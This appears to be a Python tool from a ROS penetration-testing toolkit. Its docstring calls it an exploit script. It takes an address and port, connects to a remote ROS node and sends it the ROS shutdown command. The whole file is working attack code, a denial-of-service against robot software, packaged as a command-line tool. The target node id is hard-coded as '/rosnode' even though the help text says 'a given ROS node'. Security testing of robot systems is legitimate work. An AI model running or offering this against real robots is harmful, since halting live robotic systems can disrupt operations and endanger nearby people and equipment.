#!/usr/bin/python3
import argparse

from core.node import Node


def kill_node(node: Node):
    """
        This is a simple exploit script that disables a node though the ros shutdown command
    """

    node_id = '/rosnode'
    print("Shutting down node ")
    node.server.shutdown(node_id, "")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Shutdown a given ROS node')
    parser.add_argument('-a', '--address', help="Address of the ROS node you want to shutdown", required=True)
    parser.add_argument('-p', '--port', help="Port of the ROS node you want to shutdown", required=True)
    args = parser.parse_args()
    cur_node = Node(args.address, args.port)
    kill_node(cur_node)
